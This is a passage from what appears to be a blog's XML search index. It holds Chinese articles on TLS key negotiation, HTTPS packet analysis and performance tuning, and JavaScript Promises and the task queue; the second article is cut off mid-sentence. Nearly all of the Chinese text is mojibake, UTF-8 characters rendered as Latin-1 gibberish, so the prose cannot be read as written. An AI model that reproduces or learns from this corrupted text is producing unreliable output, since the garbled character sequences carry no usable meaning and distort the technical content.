åœ¨ç¡®å®šé‡æ–°è¿æ¥å‰ï¼ŒæœåŠ¡å™¨ä¸ä¼šç«‹å³åœæ­¢å‘å®¢æˆ·ç«¯å‘é€æ•°æ®ï¼Œå¯èƒ½æ°å¥½åŒæ—¶æˆ–æœ‰ç¼“å­˜æ•°æ®éœ€è¦å‘é€ç»™å®¢æˆ·ç«¯ï¼Œä½†æ˜¯å®¢æˆ·ç«¯ä¸ä¼šå†å‘é€ä»»ä½•ä¿¡æ¯ç»™æœåŠ¡å™¨ï¼› æœåŠ¡å™¨è¯†åˆ«å‡ºé‡æ–°è¿æ¥è¯·æ±‚ä¹‹åï¼Œå‘é€ server_hello ä¿¡æ¯è‡³å®¢æˆ·ç«¯ï¼› å®¢æˆ·ç«¯ä¹ŸåŒæ ·æ— æ³•ç«‹å³åˆ¤æ–­å‡ºä¿¡æ¯éåº”ç”¨æ•°æ®ï¼ŒåŒæ ·æäº¤ç»™ä¸‹ä¸€æ­¥å¤„ç†ï¼Œå¤„ç†ä¹‹åä¼šè¿”å›é€šçŸ¥è¯¥ä¿¡æ¯ä¸ºè¦æ±‚é‡å»ºè¿æ¥ï¼› å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å¼€å§‹æ–°çš„é‡å»ºè¿æ¥è¿‡ç¨‹ï¼› å¯†é’¥è®¡ç®—ä¸ŠèŠ‚æåˆ°äº†ä¸¤ä¸ªæ˜æ–‡ä¼ é€çš„éšæœºæ•° random_C å’Œ random_S ä¸é€šè¿‡åŠ å¯†åœ¨æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯äº¤æ¢çš„ pre-masterï¼Œä¸‰ä¸ªå‚æ•°ä½œä¸ºå¯†é’¥åå•†çš„åŸºç¡€ã€‚æœ¬èŠ‚è®¨è®ºè¯´æ˜å¯†é’¥åå•†çš„åŸºæœ¬è®¡ç®—è¿‡ç¨‹ä»¥åŠé€šä¿¡è¿‡ç¨‹ä¸­å¯†é’¥çš„ä½¿ç”¨ã€‚ è®¡ç®— Key æ¶‰åŠå‚æ•° random clientã€random serverã€pre-masterã€master secretã€key materialï¼Œè®¡ç®—å¯†é’¥æ—¶ï¼ŒæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯éƒ½å…·æœ‰è¿™äº›ä¿¡æ¯ï¼Œäº¤æ¢æ–¹å¼ä¸ŠèŠ‚æœ‰è¯´æ˜ï¼Œè®¡ç®—æµç¨‹å¦‚ä¸‹ï¼š å®¢æˆ·ç«¯é‡‡ç”¨ RSA æˆ– Diffie-Hellman ç­‰åŠ å¯†ç®—æ³•ç”Ÿæˆ Pre-master; Pre-master ç»“åˆ random client å’Œ random server ä¸¤ä¸ªéšæœºæ•°ï¼Œé€šè¿‡ pseudoRandomFunction(PRF) è®¡ç®—å¾—åˆ° master secret; master secret ç»“åˆ random client å’Œ random server ä¸¤ä¸ªéšæœºæ•°ï¼Œé€šè¿‡è¿­ä»£è®¡ç®—å¾—åˆ° key master; ä»¥ä¸‹ä¸ºä¸€äº›é‡è¦çš„è®°å½•ï¼Œå¯ä»¥è§£å†³éƒ¨åˆ†çˆ±æ·±å…¥ç ”ç©¶æœ‹å‹çš„ç–‘æƒ‘ï¼Œcopy çš„ææ–™ï¼Œåˆ†äº«ç»™å¤§å®¶ï¼š (a) PreMaster secret å‰ä¸¤ä¸ªå­—èŠ‚æ—¶ TLS çš„ç‰ˆæœ¬å·ï¼Œè¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„ç”¨æ¥æ ¸å¯¹æ¡æ‰‹æ•°æ®çš„ç‰ˆæœ¬å·ï¼Œå› ä¸ºåœ¨ client_hello é˜¶æ®µï¼Œå®¢æˆ·ç«¯ä¼šå‘é€ä¸€ä»½åŠ å¯†å¥—ä»¶åˆ—è¡¨å’Œå½“å‰æ”¯æŒçš„SSL/TLS çš„ç‰ˆæœ¬å·ç»™æœåŠ¡å™¨ï¼Œè€Œä¸”æ˜¯ä½¿ç”¨æ˜æ–‡ä¼ é€çš„ï¼Œå¦‚æœæ¡æ‰‹çš„æ•°æ®åŒ…åœ¨ç ´è§£ä¹‹åï¼Œæ”»å‡»è€…å¾ˆæœ‰å¯èƒ½ç¯¡æ”¹æ•°æ®åŒ…ï¼Œé€‰æ‹©ä¸€ä¸ªå®‰å…¨æ€§è¾ƒä½çš„åŠ å¯†å¥—ä»¶å’Œç‰ˆæœ¬ç»™æœåŠ¡å™¨ï¼Œä»è€Œå¯¹æ•°æ®è¿›è¡Œç ´è§£ã€‚æ‰€ä»¥ï¼ŒæœåŠ¡ç«¯éœ€è¦å¯¹èœœæ–‡ä¸­è§£å¯†å‡ºæ¥çš„ PreMaster ç‰ˆæœ¬å·è·Ÿä¹‹å‰ Client Hello é˜¶æ®µçš„ç‰ˆæœ¬å·è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœç‰ˆæœ¬å·å˜ä½ï¼Œåˆ™è¯´æ˜è¢«ç¯¡æ”¹ï¼Œåˆ™ç«‹å³åœæ­¢å‘é€ä»»ä½•æ¶ˆæ¯ã€‚ (b) ä¸ç®¡æ˜¯å®¢æˆ·ç«¯è¿˜æ˜¯æœåŠ¡å™¨ï¼Œéƒ½éœ€è¦éšæœºæ•°ï¼Œè¿™æ ·ç”Ÿæˆçš„å¯†é’¥æ‰ä¸ä¼šæ¯æ¬¡éƒ½ä¸€æ ·ã€‚ç”±äº SSL åè®®ä¸­è¯ä¹¦æ˜¯é™æ€çš„ï¼Œå› æ­¤ååˆ†æœ‰å¿…è¦å¼•å…¥ä¸€ç§éšæœºå› ç´ æ¥ä¿è¯åå•†å‡ºæ¥çš„å¯†é’¥çš„éšæœºæ€§ã€‚ å¯¹äº RSA å¯†é’¥äº¤æ¢ç®—æ³•æ¥è¯´ï¼Œpre-master-key æœ¬èº«å°±æ˜¯ä¸€ä¸ªéšæœºæ•°ï¼Œåœ¨åŠ ä¸Š hello ä¿¡æ¯ä¸­çš„éšæœºï¼Œä¸‰ä¸ªéšæœºæ•°é€šè¿‡ä¸€ä¸ªå¯†é’¥å¯¼å‡ºå™¨æœ€ç»ˆå¯¼å‡ºä¸€ä¸ªå¯¹æˆå¯†é’¥ã€‚ pre-master çš„å­˜åœ¨åœ¨äº SSL åè®®ä¸ä¿¡ä»»æ¯ä¸ªä¸»æœºéƒ½èƒ½äº§ç”Ÿå®Œå…¨éšæœºçš„éšæœºæ•°ï¼Œå¦‚æœéšæœºæ•°ä¸éšæœºï¼Œé‚£ä¹ˆ pre master secret å°±å¯èƒ½è¢«çŒœå‡ºæ¥ï¼Œé‚£ä¹ˆä»…ä½¿ç”¨ pre master secret ä½œä¸ºå¯†é’¥å°±ä¸åˆé€‚äº†ï¼Œå› æ­¤å¿…é¡»å¼•å…¥æ–°çš„éšæœºå› ç´ ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ pre master secret ä¸‰ä¸ªéšæœºæ•°ä¸€åŒç”Ÿæˆå¯†é’¥å°±ä¸å®¹æ˜“è¢«çŒœå‡ºæ¥äº†ï¼Œä¸€ä¸ªä¼ªéšæœºå¯èƒ½å®Œå…¨ä¸éšæœºï¼Œå¯æ˜¯ä¸‰ä¸ªä¼ªéšæœºå°±ååˆ†æ¥è¿‘éšæœºäº†ï¼Œæ¯å¢åŠ ä¸€ä¸ªè‡ªç”±åº¦ï¼Œéšæœºæ€§å¢åŠ çš„å¯ä¸æ˜¯ä¸€ã€‚ å¯†é’¥ä½¿ç”¨ key ç»è¿‡ 12 è½®è¿­ä»£è®¡ç®—ä¼šäº§ç”Ÿ 12 ä¸ª hash å€¼ï¼Œåˆ†ç»„æˆ 6 ä¸ªå…ƒç´ ï¼Œåˆ—è¡¨å¦‚ä¸‹ï¼š Mac keyã€encryption key å’Œ IV æ˜¯ä¸€ç»„åŠ å¯†å…ƒç´ ï¼Œåˆ†åˆ«è¢«å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä½¿ç”¨ï¼Œä½†æ˜¯è¿™ä¸¤ç»„å…ƒç´ éƒ½è¢«ä¸¤è¾¹åŒæ—¶è·å–ï¼› å®¢æˆ·ç«¯ä½¿ç”¨ client ç»„å…ƒç´ åŠ å¯†æ•°æ®ï¼ŒæœåŠ¡å™¨ä½¿ç”¨ client å…ƒç´ è§£å¯†ï¼›æœåŠ¡å™¨ä½¿ç”¨ server å…ƒç´ åŠ å¯†ï¼Œclient ä½¿ç”¨ server å…ƒç´ è§£å¯†ï¼› åŒå‘é€šä¿¡çš„ä¸åŒæ–¹å‘ï¼Œä½¿ç”¨çš„å¯†é’¥ä¸åŒï¼Œç ´è§£é€šä¿¡è‡³å°‘è¦ç ´è§£ä¸¤æ¬¡ï¼› encrytion key ç”¨äºå¯¹ç§°åŠ å¯†æ•°æ® IV ä½œä¸ºå¾ˆå¤šåŠ å¯†ç®—æ³•çš„åˆå§‹åŒ–å‘é‡ä½¿ç”¨ï¼Œå…·ä½“å¯ä»¥ç ”ç©¶å †æˆåŠ å¯†ç®—æ³•ï¼› Mac key ç”¨äºæ•°æ®çš„å®Œæ•´æ€§æ ¡éªŒï¼› æ•°æ®åŠ å¯†é€šä¿¡è¿‡ç¨‹ å¯¹åº”ç”¨å±‚æ•°æ®è¿›è¡Œåˆ†ç‰‡æˆåˆé€‚çš„ block; ä¸ºåˆ†ç‰‡æ•°æ®ç¼–å·ï¼Œé˜²æ­¢é‡æ”¾æ”»å‡»ï¼› ä½¿ç”¨åå•†çš„å‹ç¼©ç®—æ³•å‹ç¼©æ•°æ®ï¼› è®¡ç®— MAC å€¼å’Œå‹ç¼©æ•°æ®ç»„æˆä¼ è¾“æ•°æ®ï¼› ä½¿ç”¨ client encryption key åŠ å¯†æ•°æ®ï¼Œå‘é€ç»™æœåŠ¡å™¨ï¼› server æ”¶åˆ°æ•°æ®åï¼Œä½¿ç”¨ client encryption key è§£å¯†ï¼Œæ ¡éªŒæ•°æ®ï¼Œè§£å‹æ•°æ®ï¼Œé‡æ–°ç»„è£…ï¼› æ³¨æ„ï¼šMAC å€¼çš„è®¡ç®—åŒ…æ‹¬è¿ä¸ª hash å€¼ï¼šclient Mac key å’Œ Hash (ç¼–å·ã€åŒ…ç±»å‹ã€é•¿åº¦ã€å‹ç¼©æ•°æ®) æŠ“åŒ…åˆ†æå…³äºæŠ“åŒ…ä¸å†è¯¦ç»†åˆ†æï¼ŒæŒ‰ç…§å‰é¢çš„åˆ†æï¼ŒåŸºæœ¬æƒ…å†µéƒ½èƒ½å¤ŸåŒ¹é…ï¼Œæ ¹æ®å¹³å¸¸å®šä½é—®é¢˜çš„è¿‡ç¨‹ï¼Œä¸ªäººè®¤ä¸ºéœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼š æŠ“åŒ… HTTP é€šä¿¡ï¼Œèƒ½å¤Ÿæ¸…æ™°çœ‹åˆ°é€šä¿¡çš„å¤´éƒ¨å’Œä¿¡æ¯çš„æ˜æ–‡ï¼Œä½†æ˜¯ HTTPS æ˜¯åŠ å¯†é€šä¿¡ï¼Œæ— æ³•çœ‹åˆ° HTTP åè®®çš„ç›¸å…³å¤´éƒ¨å’Œæ•°æ®çš„æ˜æ–‡ä¿¡æ¯ï¼› æŠ“åŒ… HTTPS é€šä¿¡ä¸»è¦åˆ†ä¸ºä¸‰ä¸ªè¿‡ç¨‹ï¼šTCP å»ºç«‹è¿æ¥ã€TLS æ¡æ‰‹ã€TLS åŠ å¯†é€šä¿¡ã€‚ä¸»è¦åˆ†æ HTTPS é€šä¿¡çš„æ¡æ‰‹å»ºç«‹å’ŒçŠ¶æ€ç­‰ä¿¡æ¯ï¼› Client_hello æ ¹æ® version èƒ½å¤ŸçŸ¥é“å®¢æˆ·ç«¯æ”¯æŒçš„æœ€é«˜çš„åè®®ç‰ˆæœ¬å·ï¼Œå¦‚æœæ˜¯ SSL 3.0 æˆ– TLS 1.0 ç­‰åœ°ç‰ˆæœ¬åè®®ï¼Œéå¸¸æ³¨æ„å¯èƒ½å› ä¸ºç‰ˆæœ¬ä½å¼•èµ·ä¸€äº›æ¡æ‰‹å¤±è´¥çš„æƒ…å†µï¼› æ ¹æ®æ‰©å±•å­—æ®µä¸­çš„ server_name å­—æ®µåˆ¤æ–­æ˜¯å¦æ”¯æŒ SNIï¼Œå­˜åœ¨åˆ™æ”¯æŒï¼Œå¦åˆ™ä¸æ”¯æŒï¼Œå¯¹äºå®šä½æ¡æ‰‹å¤±è´¥æˆ–è¯ä¹¦è¿”å›é”™è¯¯éå¸¸æœ‰ç”¨ï¼› ä¼šè¯æ ‡è¯† session ID æ˜¯æ ‡å‡†åè®®éƒ¨åˆ†ï¼Œå¦‚æœæ²¡æœ‰å»ºç«‹è¿‡è¿æ¥ï¼Œåˆ™è¯¥å­—æ®µä¸ºç©ºï¼Œä¸ä¸ºç©ºåˆ™è¯´æ˜ä¹‹å‰å»ºç«‹è¿‡è¿æ¥å¹¶ç¼“å­˜ï¼› ä¼šè¯è®°å½• session ticket æ˜¯æ‰©å±•åè®®éƒ¨åˆ†ï¼Œå­˜åœ¨è¯¥å­—æ®µåˆ™è¯´æ˜åè®®æ”¯æŒ session ticket, å¦åˆ™ä¸æ”¯æŒï¼Œå­˜åœ¨ä¸”ä¸ºç©ºï¼Œè¯´æ˜ä¹‹å‰æœªå»ºç«‹å¹¶ç¼“å­˜è¿æ¥ï¼Œå­˜åœ¨ä¸”å€¼ä¸ä¸ºç©ºï¼Œè¯´æ˜æœ‰ç¼“å­˜è¿æ¥ï¼› Server_hello æ ¹æ® TLS version å­—æ®µèƒ½å¤Ÿæ¨æ–­å‡ºæœåŠ¡å™¨æ”¯æŒçš„åè®®çš„æœ€é«˜ç‰ˆæœ¬ï¼Œç‰ˆæœ¬ä¸åŒå¯èƒ½é€ æˆæ¡æ‰‹å¤±è´¥ï¼› åŸºäº cipher_suite ä¿¡æ¯åˆ¤æ–­å‡ºæœåŠ¡å™¨ä¼˜å…ˆæ”¯æŒçš„åŠ å¯†åè®®ï¼› certificate æœåŠ¡å™¨é…ç½®å¹¶è¿”å›çš„è¯ä¹¦é“¾ï¼Œæ ¹æ®è¯ä¹¦ä¿¡æ¯ï¼Œå¹¶ä¸æœåŠ¡å™¨é…ç½®æ–‡ä»¶å¯¹æ¯”ï¼Œåˆ¤æ–­è¯·æ±‚ä¸æœŸæœ›æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸ä¸€è‡´ï¼Œæ˜¯å¦è¿”å›çš„é»˜è®¤è¯ä¹¦ï¼› alert è­¦å‘Šä¿¡æ¯ alert ä¼šè¯´æ˜å»ºç«‹è¿æ¥å¤±è´¥çš„åŸå› å³è­¦å‘Šç±»å‹ï¼Œå¯¹äºå®šä½é—®é¢˜éå¸¸é‡è¦ï¼› HTTPS æ€§èƒ½ä¼˜åŒ–HTTPS æ€§èƒ½æ¶ˆè€—å‰æ–‡è®¨è®ºäº† HTTPS çš„åŸç†åŠä¼˜åŠ¿ï¼šèº«ä»½éªŒè¯ã€ä¿¡æ¯åŠ å¯†ã€å®Œæ•´æ€§æ ¡éªŒç­‰ï¼Œä¸”æœªå¯¹ HTTP å’Œ TCP åšä»»ä½•ä¿®æ”¹ã€‚ä½†é€šè¿‡å¢åŠ æ–°åè®®ä»¥å®ç°æ›´å®‰å…¨çš„é€šä¿¡å¿…ç„¶è¦ä»˜å‡ºä»£ä»·ï¼ŒHTTPS çš„æ€§èƒ½æŸè€—ä¸»è¦ä½“ç°å¦‚ä¸‹ï¼š å¢åŠ å»¶æ—¶ åˆ†æå‰é¢çš„æ¡æ‰‹è¿‡ç¨‹ï¼Œä¸€æ¬¡å®Œæ•´çš„æ¡æ‰‹è¿‡ç¨‹è‡³å°‘éœ€è¦ä¸¤ç«¯ä¾æ¬¡æ¥å›ä¸¤æ¬¡é€šä¿¡ï¼Œè‡³å°‘å¢åŠ å»¶æ—¶ 2 RTTï¼Œåˆ©ç”¨å›è¯ç¼“å­˜ä»è€Œå¤ç”¨è¿æ¥ï¼Œä¹Ÿè‡³å°‘è¦å¢åŠ  1 RTTå»¶æ—¶ã€‚ æ¶ˆè€—è¾ƒå¤šçš„ CPU èµ„æº å‡ºäº†æ•°æ®ä¼ è¾“å¤–ï¼ŒHTTPS ä¸»è¦åŒ…æ‹¬å¯¹å¯¹ç§°åŠ è§£å¯†ã€éå¯¹ç§°åŠ è§£å¯†ï¼ˆæœåŠ¡å™¨ä¸»è¦é‡‡ç”¨ç§é’¥è§£å¯†æ•°æ®ï¼‰ï¼›å‹æµ‹ TS8 æœºå‹çš„å•æ ¸ CPUï¼›å¯¹ç§°åŠ å¯†ç®—æ³• AES-CBC-256 ååé‡ 600Mbpsï¼Œéå¯¹ç§° RSA ç§é’¥è§£å¯† 200 æ¬¡/s ã€‚ä¸è€ƒè™‘å…¶ä»–è½¯ä»¶å±‚é¢çš„å¼€é”€ï¼Œ10G ç½‘å¡ä¸ºå¯¹ç§°åŠ å¯†éœ€è¦æ¶ˆè€— CPU çº¦ 17 æ ¸ï¼Œ24 æ ¸ CPU æœ€å¤šæ¥å…¥ HTTPS 4800ï¼› é™æ€èŠ‚ç‚¹å½“å‰ 10G ç½‘å¡çš„ TS8 æœºå‹çš„ HTTP å•æœºæ¥å…¥èƒ½åŠ›çº¦ä¸º 10w/sï¼Œå¦‚æœå°†æ‰€æœ‰çš„ HTTP è¿æ¥å˜ä¸º HTTPS è¿æ¥ï¼Œåˆ™æ˜æ˜¾ RSA çš„è§£å¯†æœ€å…ˆæˆä¸ºç“¶é¢ˆã€‚å› æ­¤ï¼ŒRSA çš„è§£å¯†èƒ½åŠ›æ˜¯å½“å‰å›°æ‰° HTTPS æ¥å…¥çš„ä¸»è¦éš¾é¢˜ã€‚ HTTPS æ¥å…¥ä¼˜åŒ– CDN æ¥å…¥ HTTPS å¢åŠ çš„å»¶æ—¶ä¸»è¦æ˜¯ RTTï¼ŒRTT çš„ç‰¹ç‚¹æ˜¯èŠ‚ç‚¹è¶Šè¿‘å»¶æ—¶è¶Šå°ï¼ŒCDN å¤©ç„¶ç¦»ç”¨æˆ·æœ€è¿‘ï¼Œ å› æ­¤é€‰ç”¨ CDN ä½œä¸º HTTPS çš„æ¥å…¥å£ï¼Œå°†èƒ½æå¤§å‡å°‘æ¥å…¥å»¶æ—¶ã€‚CDN èŠ‚ç‚¹é€šè¿‡å’Œä¸šåŠ¡æœåŠ¡å™¨ç»´æŒé•¿è¿æ¥ã€ä¼šè¯å¤ç”¨å’Œé“¾è·¯è´¨é‡ä¼˜åŒ–ç­‰å¯æ§æ–¹æ³•ï¼Œæå¤§çš„å‡å°‘ HTTPS å¸¦æ¥çš„å»¶æ—¶ã€‚ ä¼šè¯ç¼“å­˜ è™½ç„¶å‰æ–‡æåˆ° HTTPS å³ä½¿é‡‡ç”¨ä¼šè¯ç¼“å­˜ä¹Ÿè‡³å°‘è¦ 1 * RTT çš„å»¶æ—¶ï¼Œä½†æ˜¯è‡³å°‘å»¶æ—¶å·²ç»å‡å°‘ä¸ºåŸæ¥çš„ä¸€åŠï¼Œæ˜æ˜¾çš„å»¶æ—¶ä¼˜åŒ–ï¼›åŒæ—¶ï¼ŒåŸºäºä¼šè¯ç¼“å­˜å»ºç«‹çš„ HTTPS è¿æ¥ä¸éœ€è¦æœåŠ¡å™¨ä½¿ç”¨ RSA ç§é’¥è§£å¯†è·å– Pre-master ä¿¡æ¯ï¼Œå¯ä»¥çœå» CPU æ¶ˆè€—ã€‚å¦‚æœä¸šåŠ¡è¿æ¥è®¿é—®é›†ä¸­ï¼Œç¼“å­˜å‘½ä¸­ç‡é«˜ï¼Œåˆ™ HTTPS æ¥å…¥èƒ½åŠ›ä¼šæ˜æ˜¾æå‡ã€‚ ç¡¬ä»¶åŠ é€Ÿ ä¸ºä»‹å…¥æœåŠ¡å™¨å®‰è£…ä¸“ç”¨çš„ SSL ç¡¬ä»¶åŠ é€Ÿå¡ï¼Œä½œç”¨ç±»ä¼¼ GPUï¼Œé‡Šæ”¾ CPUï¼Œèƒ½å¤Ÿå…·æœ‰æ›´é«˜çš„ HTTPS ä»‹å…¥èƒ½åŠ›ä¸”ä¸å½±å“ä¸šåŠ¡ç¨‹åºã€‚æµ‹è¯•æŸç¡¬ä»¶åŠ é€Ÿå¡å•å¡å¯ä»¥æä¾› 35k çš„è§£å¯†èƒ½åŠ›ï¼Œç›¸å½“äº 175æ ¸ CPUï¼Œè‡³å°‘ç›¸å½“äº 7 å° 24 æ ¸çš„æœåŠ¡å™¨ï¼Œè€ƒè™‘åˆ°æ¥å…¥æœåŠ¡å™¨å…¶ä»–ç¨‹åºçš„å¼€é”€ï¼Œä¸€å¼ ç¡¬ä»¶å¡å¯ä»¥å®ç°æ¥è¿‘ 10 å°æœåŠ¡å™¨çš„ä»‹å…¥èƒ½åŠ›ã€‚ è¿œç¨‹è§£å¯† æœ¬åœ°æ¥å…¥æ¶ˆè€—è¿‡å¤šçš„ CPU èµ„æºï¼Œæµªè´¹äº†ç½‘å¡å’Œç¡¬ç›˜èµ„æºï¼Œè€ƒè™‘å°†æœ€æ¶ˆè€— CPU èµ„æºçš„ RSA è§£å¯†è®¡ç®—ä»»åŠ¡è½¬ç§»åˆ°å…¶ä»–æœåŠ¡å™¨ï¼Œå¦‚æ­¤åˆ™å¯ä»¥å……åˆ†å‘æŒ¥æœåŠ¡å™¨çš„ä»‹å…¥èƒ½åŠ›ï¼Œå……åˆ†åˆ©ç”¨å®½å¸¦ä¸ç½‘å¡èµ„æºã€‚è¿œç¨‹è§£å¯†æœåŠ¡å™¨å¯ä»¥é€‰æ‹© CPU è´Ÿè½½è¾ƒä½çš„æœºå™¨å……å½“ï¼Œå®ç°æœºå™¨èµ„æºçš„å¤ç”¨ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸“é—¨ä¼˜åŒ–çš„é«˜è®¡ç®—æ€§èƒ½æœåŠ¡å™¨ã€‚å½“å‰ä¹Ÿæ˜¯ CDN ç”¨äºå¤§è§„æ¨¡ HTTPS æ¥å…¥çš„è§£å†³æ–¹æ¡ˆä¹‹ä¸€ã€‚ SPDY/HTTP2 å‰é¢çš„æ–¹æ³•åˆ†åˆ«ä»å‡å°‘å»¶æ—¶å’Œå•æœºè´Ÿè½½çš„æ–¹æ³•æé«˜ HTTPS çš„ä»‹å…¥èƒ½åŠ›ï¼Œä½†æ˜¯æ–¹æ³•éƒ½æ˜¯åŸºäºä¸å˜çš„ HTTP åè®®çš„åŸºç¡€ä¸Šæå‡ºçš„ä¼˜åŒ–æ–¹æ³•ï¼ŒSPDY/HTTP2 åˆ©ç”¨ TLS/SSL å¸¦æ¥çš„ä¼˜åŠ¿ï¼Œé€šè¿‡ä¿®æ”¹åè®®çš„æ–¹æ³•æ¥æå‡ HTTPS çš„æ€§èƒ½ï¼Œæé«˜ä¸‹è½½é€Ÿåº¦ç­‰ã€‚]]></content>
      <categories>
        <category>https</category>
      </categories>
      <tags>
        <tag>https</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js å¼‚æ­¥è¿›åŒ–å²ä¹‹Promise]]></title>
    <url>%2Fjs%E5%BC%82%E6%AD%A5%E8%BF%9B%E5%8C%96%E5%8F%B2%E4%B9%8BPromise%2F</url>
    <content type="text"><![CDATA[åœ¨ä¸Šä¸€ç¯‡ js å¼‚æ­¥è¿›åŒ–å²ä¹‹å›è°ƒ æˆ‘ä»¬äº†è§£åˆ°åŸºäºå›è°ƒå¤„ç†å¼‚æ­¥é—®é¢˜å­˜åœ¨ä¸€äº›ç¼ºé™·ã€‚é‚£ä¹ˆ Promise æ˜¯ä»€ä¹ˆï¼Ÿèƒ½å¤Ÿè§£å†³å›è°ƒé€ æˆçš„é—®é¢˜å—ï¼Ÿåˆä¼šä¸ä¼šå¼•å…¥æ–°çš„é—®é¢˜ï¼Ÿä¸‹é¢æˆ‘ä»¬ä¸€èµ·æ¥åˆ†æä¸€ä¸‹ã€‚ ä»€ä¹ˆæ˜¯ Promise? Promise è‹±æ–‡æ„æ€ï¼šæ‰¿è¯ºã€‚å—¯ï¼Œä¸€çœ‹å°±è§‰å¾—é è°±ï¼ Promise åªæœ‰ä¸‰ç§çŠ¶æ€ï¼šæœªå†³è®®ã€resolveã€rejectï¼Œå¹¶ä¸”ä¸€æ—¦å†³è®®ï¼ŒçŠ¶æ€ä¸å¯åœ¨æ›´æ”¹ã€‚åªèƒ½ç”±æœªå†³è®® &gt; resolveï¼Œæˆ– æœªå†³è®® &gt; rejectï¼Œä¸¤æ¡çŠ¶æ€è½¬æ¢è·¯çº¿ï¼Œä¸èƒ½é€†è½¬ï¼Œresolve ä¹Ÿä¸èƒ½è½¬ä¸º rejectã€‚å¦‚å›¾ï¼š å°æ—¶å€™æœ‰ç©è¿‡é­ç‚®çš„å°æœ‹å‹å¯ä»¥ä¼šæƒ³åˆ°ï¼Œæœªå†³è®®çŠ¶æ€ä¸å°±åƒç‚¹ç‡ƒé­ç‚®ä¸€æ ·å—ï¼Ÿè¦ä¹ˆæˆåŠŸçˆ†ç‚¸(resolve)ï¼Œè¦ä¹ˆæ˜¯å“‘ç‚®(reject)ã€‚ æ²¡é”™ï¼Œå°±æ˜¯è¿™æ ·ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯ä¸æ˜ç™½ Promise æ˜¯ä»€ä¹ˆï¼Ÿ å¥½å§ï¼Œæˆ‘ä»¬ç»§ç»­ï¼Œä½ ä¼šæ˜ç™½çš„~ I promise! ç†è§£ Promise æˆ‘ä»¬å…ˆæ”¾ä¸‹å¯¹ Promise æ¦‚å¿µçš„çº ç»“ï¼Œé¦–å…ˆæƒ³æƒ³è¿™ä¸¤ä¸ªé—®é¢˜ï¼š es6 æä¾›çš„ Promise åŸºäºåº•å±‚å®ç°çš„é‚£äº›æ”¹å˜ï¼Œèƒ½å¦é€šè¿‡å›è°ƒç­‰å…¶ä»–æœºåˆ¶è¿›è¡Œæ¨¡æ‹Ÿï¼Ÿ Promise æ˜¯ä¸ºäº†è§£å†³ä»€ä¹ˆé—®é¢˜è€Œå‡ºç°çš„ï¼Ÿ ä¸æ€¥ï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸€ä¸ªé—®é¢˜æ¥å¤„ç†ï½ es6 ä¹‹ä»»åŠ¡é˜Ÿåˆ—åœ¨ es6 ä¸­æ–°å¢äº†ä¸€ä¸ªåä¸ºä»»åŠ¡é˜Ÿåˆ—çš„æ¦‚å¿µï¼Œè¯¥é˜Ÿåˆ—å»ºç«‹äºäº‹ä»¶å¾ªç¯é˜Ÿåˆ—ä¹‹ä¸Šã€‚è€Œ Promise çš„å¼‚æ­¥ç‰¹æ€§æ­£æ˜¯åŸºäºä»»åŠ¡é˜Ÿåˆ—ã€‚äº‹ä»¶å¾ªç¯é˜Ÿåˆ—æˆ‘ä»¬åœ¨js å¼‚æ­¥è¿›åŒ–å²ä¹‹å›è°ƒå·²ç»ä»‹ç»è¿‡ï¼Œè¿™é‡Œä¸åœ¨èµ˜è¿°ï¼Œæˆ‘ä»¬æ¥è¯¦ç»†åˆ†æä¸‹ä»»åŠ¡é˜Ÿåˆ—ã€‚ å¤§å®¶æ¥çœ‹çœ‹è¿™æ®µä»£ç è¾“å‡ºé¡ºåºæ˜¯ä»€ä¹ˆï¼Ÿï¼ˆå…ˆæœ‰è‡ªå·±çš„ç­”æ¡ˆå†å¾€ä¸‹çœ‹ï¼‰ 123456789101112setTimeout(function() &#123; console.log('A');&#125;, 0);Promise.resolve(1).then(function() &#123; console.log('B'); Promise.resolve(1).then(function() &#123; console.log('C'); &#125;);&#125;);console.log('D'); æ­£ç¡®é¡ºåºæ˜¯ D &gt; B &gt; C &gt; A ä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºä»»åŠ¡é˜Ÿåˆ—æ˜¯å»ºç«‹åœ¨äº‹ä»¶å¾ªç¯é˜Ÿåˆ—ä¸Šçš„é˜Ÿåˆ—ï¼Œä¹Ÿå°±æ˜¯è¯´â€¦.ç®—äº†æˆ‘ä¹Ÿè¯´ä¸æ¸…ï¼Œä¸Šå›¾ä¸Šå›¾ ä¹Ÿå°±æ˜¯è¯´ï¼Œjs å¼•æ“ä¼šä¼˜å…ˆå¤„ç†ä»»åŠ¡é˜Ÿåˆ—çš„ä»»åŠ¡ï¼Œç›´åˆ°ä»»åŠ¡ä»»åŠ¡é˜Ÿåˆ—ä¸ºç©ºæ‰è½¬è€Œæ‰§è¡Œäº‹ä»¶å¾ªç¯é˜Ÿåˆ—çš„äº‹ä»¶ã€‚æ‰€ä»¥ç†è®ºä¸Šè¯´ï¼Œä»»åŠ¡å¾ªç¯å¯èƒ½ä¼šå¯¼è‡´æ— é™å¾ªç¯ï¼Œè¿›è€Œå¯¼è‡´ç¨‹åºé¥¿æ­»ï¼Œæ— æ³•è½¬ç§»åˆ°ä¸‹ä¸€ä¸ªäº‹ä»¶å¾ªç¯ tickã€‚ æ³¨ï¼šè¿™é‡Œä¸»è¦ä¸ºäº†æ–¹ä¾¿ç†è§£ï¼ŒçœŸå®æƒ…å†µä¸æ˜¯è¿™æ 